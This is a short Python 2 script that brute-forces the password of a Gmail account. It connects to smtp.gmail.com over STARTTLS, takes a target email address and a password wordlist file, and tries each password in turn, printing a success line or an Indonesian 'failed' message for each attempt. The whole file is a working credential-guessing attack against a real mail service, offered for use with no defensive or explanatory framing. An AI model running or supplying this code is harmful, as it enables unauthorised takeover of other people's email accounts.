import smtplib

print("")

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("Enter Email = > : ")
passwfile = raw_input("Enter List = > : ")
passwfile = open(passwfile, "r")
print
print "[$] Starting", user
print
print

for password in passwfile:
	try:
		smtpserver.login(user, password)

		print "  [$] Login Succes => : %s" % password
		break;
	except smtplib.SMTPAuthenticationError:
		print "[#] Gagal :( => : %s" % password
